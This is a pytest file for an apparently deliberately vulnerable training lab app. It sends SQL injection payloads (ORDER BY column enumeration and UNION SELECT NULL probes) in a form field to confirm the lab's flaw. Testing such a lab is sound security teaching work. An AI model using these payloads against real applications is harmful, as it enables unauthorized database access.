import pytest
import requests
import time

BASE_URL = "http://localhost:5000"

@pytest.fixture(scope="session", autouse=True)
def wait_for_app():
    # Wait for the app to be up (for Docker Compose)
    for _ in range(30):
        try:
            r = requests.get(f"{BASE_URL}/lab")
            if r.status_code == 200:
                return
        except Exception:
            time.sleep(1)
    pytest.exit("App did not start in time")

def test_lab_search_vulnerable():
    # Test normal search
    r = requests.post(f"{BASE_URL}/lab", data={"project_id": "1"})
    assert r.status_code == 200
    assert "Quantum Computing Initiative" in r.text

    # Test SQL injection: ORDER BY to enumerate columns
    for i in range(1, 7):
        inj = f"1 ORDER BY {i}-- -"
        resp = requests.post(f"{BASE_URL}/lab", data={"project_id": inj})
        if "Error" in resp.text or "error" in resp.text:
            assert i == 5  # 4 columns, error at 5
            break
    else:
        pytest.fail("ORDER BY injection did not reveal column count")

    # Test UNION SELECT with NULLs
    for n in range(1, 7):
        inj = "1' UNION SELECT " + ",".join(["NULL"] * n) + "-- -"
        resp = requests.post(f"{BASE_URL}/lab", data={"project_id": inj})
        if "Error" not in resp.text and "error" not in resp.text:
            assert n == 4  # Should succeed with 4 columns
            break
    else:
        pytest.fail("UNION SELECT injection did not reveal correct column count") 